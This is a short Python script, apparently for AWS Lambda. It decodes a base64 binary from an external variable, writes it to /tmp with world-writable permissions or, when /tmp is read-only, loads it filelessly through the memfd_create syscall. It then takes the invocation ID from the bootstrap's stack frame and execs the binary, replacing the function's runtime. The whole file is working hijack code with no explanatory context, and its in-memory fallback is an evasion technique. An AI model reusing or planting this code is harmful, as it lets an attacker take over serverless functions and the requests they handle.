import os
import ctypes 
import inspect
from base64 import b64decode

MEMFD_CREATE_SYSCALL = 319

# Decode new runtime
new_runtime = b64decode(external_data_b64) # external_data_b64 is defined in the yaml file

# Write the new runtime into a file 
if os.access("/tmp", os.W_OK):
    new_runtime_path = "/tmp/new_runtime"
    with open(new_runtime_path, "wb") as f:
        f.write(new_runtime)
    os.chmod(new_runtime_path, 0o777)
else:
    # In case /tmp is read-only, create the new runtime file in memory 
    memfd = ctypes.CDLL(None).syscall(MEMFD_CREATE_SYSCALL,"new_runtime", 0) 
    os.write(memfd, new_runtime)
    new_runtime_path = "/proc/self/fd/" + str(memfd)

# Get the invoke id from the _GLOBAL_AWS_REQUEST_ID variable in bootstrap.py
invoke_id = str(inspect.stack()[-2][0].f_globals["_GLOBAL_AWS_REQUEST_ID"])

# Exec the new runtime
args = [new_runtime_path, invoke_id]
os.execvp(new_runtime_path, args)



